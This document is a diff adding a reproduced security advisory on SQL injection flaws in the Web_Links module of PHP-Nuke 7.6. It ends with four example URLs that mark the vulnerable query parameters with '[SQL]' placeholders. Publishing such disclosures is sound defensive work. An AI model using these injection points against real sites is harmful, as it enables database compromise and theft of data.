@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/13055/info
+
+The Web_Links module of PHP-Nuke is affected by multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+These issues are reported to affect PHP-Nuke version 7.6; earlier versions may also be affected.
+
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=modifylinkrequestS&url='[SQL]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=viewlink&orderby=[SQL]&min=[SQL]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=search&query=sex&orderby=[SQL]&min=[SQL]&show=[SQL]
+http://www.example.com/[php-nuke]/modules.php?name=Web_Links&l_op=MostPopular&ratenum=[SQL]&ratetype=num 
